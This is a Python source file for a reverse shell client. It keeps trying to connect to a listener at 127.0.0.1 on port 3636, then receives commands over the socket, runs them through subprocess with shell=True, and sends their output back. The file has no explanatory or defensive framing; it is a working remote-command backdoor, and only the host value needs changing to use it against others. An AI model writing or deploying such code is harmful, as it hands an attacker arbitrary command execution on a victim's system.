import socket
from threading import Thread
import subprocess
import os


def recvall():
    trigger = True
    data = b''
    data = s.recv(4096)
    while trigger == True:
        if b"EOFD" not in data:
            data += s.recv(4096)
        else:
            trigger = False
            data = data[:-4]
            return data

def process():
    while True:
        path = os.getcwd()
        cmd = path + "> " + "EOFD"
        s.sendall(cmd.encode())
        data = recvall().decode(encoding="utf-8", errors="ignore")
        sub = subprocess.run([data], shell=True,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = sub.stdout or sub.stderr
        s.sendall(output+"EOFD".encode(encoding="utf-8", errors="ignore"))


host = "127.0.0.1"
port = 3636

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        s.connect((host, port))
        break
    except:
        pass

try:
    accept_thread = Thread(target=process())
    accept_thread.start()
except:
    pass

s.close()
